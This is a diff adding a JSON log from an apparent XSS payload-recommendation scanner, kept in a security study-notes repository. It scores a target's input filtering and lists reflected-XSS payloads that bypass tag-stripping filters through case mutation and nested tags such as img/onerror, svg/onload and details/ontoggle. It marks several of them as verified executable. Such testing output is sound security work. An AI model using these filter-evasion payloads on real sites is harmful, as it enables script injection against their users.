@@ -1,0 +1,355 @@
+{
+  "generated_by": "recommend_payload.py",
+  "generated_at": "2026-10-17T18:45:59.017054",
+  "source_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/SecurityPlatform/log/20261017-184131-xss_reflection_analysis.json",
+  "source_keyword_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/SecurityPlatform/log/20261017-184131-xss_keyword_analysis.json",
+  "reflections": [
+    {
+      "reflection_index": 1,
+      "context": "attr",
+      "quote": "\"",
+      "scores": {
+        "'": 0,
+        "\"": 0,
+        ">": 0,
+        "<": 0,
+        "/": 100,
+        "\\": 100
+      },
+      "keyword_mask": {
+        "parentheses": true,
+        "backtick": true,
+        "alert": true,
+        "confirm": true,
+        "prompt": true,
+        "script_tag": false,
+        "javascript_proto": true,
+        "onerror": true,
+        "img_tag": false,
+        "entity_lt": false,
+        "srcdoc": true,
+        "onload": true,
+        "ontoggle": true,
+        "autofocus": true,
+        "onfocus": true,
+        "print": true,
+        "svg_tag": false,
+        "details_tag": false,
+        "body_tag": false,
+        "iframe_tag": false,
+        "call_alert": true,
+        "call_confirm": true,
+        "call_prompt": true,
+        "call_print": true,
+        "tick_alert": true,
+        "tick_confirm": true,
+        "tick_prompt": true,
+        "pair_img_onerror": true,
+        "pair_svg_onload": true,
+        "pair_details_ontoggle": true,
+        "pair_body_onload": true,
+        "pair_iframe_onload": true,
+        "close_script": false,
+        "close_title": false,
+        "close_noscript": false,
+        "close_style": false,
+        "close_iframe": false,
+        "js_break_squote": false,
+        "js_break_dquote": false,
+        "proto_href": true,
+        "case_script": true,
+        "case_onload": true,
+        "case_proto": true,
+        "newline": true,
+        "comment_close": true,
+        "interp": true
+      },
+      "candidates": []
+    },
+    {
+      "reflection_index": 2,
+      "context": "html",
+      "quote": "\"",
+      "scores": {
+        "'": 100,
+        "\"": 100,
+        ">": 100,
+        "<": 100,
+        "/": 100,
+        "\\": 100
+      },
+      "keyword_mask": {
+        "parentheses": true,
+        "backtick": true,
+        "alert": true,
+        "confirm": true,
+        "prompt": true,
+        "script_tag": false,
+        "javascript_proto": true,
+        "onerror": true,
+        "img_tag": true,
+        "entity_lt": true,
+        "srcdoc": true,
+        "onload": true,
+        "ontoggle": true,
+        "autofocus": true,
+        "onfocus": true,
+        "print": true,
+        "svg_tag": true,
+        "details_tag": true,
+        "body_tag": true,
+        "iframe_tag": true,
+        "call_alert": true,
+        "call_confirm": true,
+        "call_prompt": true,
+        "call_print": true,
+        "tick_alert": true,
+        "tick_confirm": true,
+        "tick_prompt": true,
+        "pair_img_onerror": true,
+        "pair_svg_onload": true,
+        "pair_details_ontoggle": true,
+        "pair_body_onload": true,
+        "pair_iframe_onload": true,
+        "close_script": true,
+        "close_title": true,
+        "close_noscript": true,
+        "close_style": true,
+        "close_iframe": true,
+        "js_break_squote": true,
+        "js_break_dquote": true,
+        "proto_href": true,
+        "case_script": true,
+        "case_onload": true,
+        "case_proto": true,
+        "newline": true,
+        "comment_close": true,
+        "interp": true
+      },
+      "candidates": [
+        {
+          "payload": "<ScRiPt vvm{id}>alert(1)</ScRiPt>",
+          "technique": "case-mutated script tag",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<ScRiPt vvm{id}>alert`1`</ScRiPt>",
+          "technique": "case-mutated script tag",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>alert(1)</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>alert`1`</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>confirm(1)</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>confirm`1`</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>prompt(1)</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>prompt`1`</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<sc<script>ript vvm{id}>print()</sc<script>ript>",
+          "technique": "nested tag-strip bypass (<script> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<i<imgmg src=x vvm{id} onerror=alert(1)>",
+          "technique": "nested tag-strip bypass (<img removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<i<imgmg src=x vvm{id} onerror=alert`1`>",
+          "technique": "nested tag-strip bypass (<img removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<i<img>mg src=x vvm{id} onerror=alert(1)>",
+          "technique": "nested tag-strip bypass (<img> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<i<img>mg src=x vvm{id} onerror=alert`1`>",
+          "technique": "nested tag-strip bypass (<img> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<s<svgvg vvm{id} onload=alert(1)>",
+          "technique": "nested tag-strip bypass (<svg removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<s<svgvg vvm{id} onload=alert`1`>",
+          "technique": "nested tag-strip bypass (<svg removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<s<svg>vg vvm{id} onload=alert(1)>",
+          "technique": "nested tag-strip bypass (<svg> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<s<svg>vg vvm{id} onload=alert`1`>",
+          "technique": "nested tag-strip bypass (<svg> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<det<detailsails open vvm{id} ontoggle=alert(1)>",
+          "technique": "nested tag-strip bypass (<details removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<det<detailsails open vvm{id} ontoggle=alert`1`>",
+          "technique": "nested tag-strip bypass (<details removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        },
+        {
+          "payload": "<det<details>ails open vvm{id} ontoggle=alert(1)>",
+          "technique": "nested tag-strip bypass (<details> removed)",
+          "case_ref": "tag_removed",
+          "efficiency": 100
+        }
+      ],
+      "verification": [
+        {
+          "payload": "<ScRiPt vvmvggddd>alert(1)</ScRiPt>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<ScRiPt vvmcqooux>alert`1`</ScRiPt>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmdtdxhy>alert(1)</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmrduxby>alert`1`</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmysuvzf>confirm(1)</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmlgjisl>confirm`1`</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmhtllkt>prompt(1)</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmhdtyoq>prompt`1`</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<sc<script>ript vvmkelygu>print()</sc<script>ript>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<i<imgmg src=x vvmzxioal onerror=alert(1)>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<i<imgmg src=x vvmukvylw onerror=alert`1`>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<i<img>mg src=x vvmezqxyj onerror=alert(1)>",
+          "confidence": "V",
+          "evidence": "<img> marker element carries event handler onerror"
+        },
+        {
+          "payload": "<i<img>mg src=x vvmqyxwtr onerror=alert`1`>",
+          "confidence": "V",
+          "evidence": "<img> marker element carries event handler onerror"
+        },
+        {
+          "payload": "<s<svgvg vvmszkcfn onload=alert(1)>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<s<svgvg vvmiukygs onload=alert`1`>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<s<svg>vg vvmmbaywh onload=alert(1)>",
+          "confidence": "V",
+          "evidence": "<svg> marker element carries event handler onload"
+        },
+        {
+          "payload": "<s<svg>vg vvmakdrbo onload=alert`1`>",
+          "confidence": "V",
+          "evidence": "<svg> marker element carries event handler onload"
+        },
+        {
+          "payload": "<det<detailsails open vvmzyyvlv ontoggle=alert(1)>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<det<detailsails open vvmfmvrxb ontoggle=alert`1`>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<det<details>ails open vvmrapodz ontoggle=alert(1)>",
+          "confidence": "V",
+          "evidence": "<details> marker element carries event handler ontoggle"
+        }
+      ]
+    }
+  ]
+}
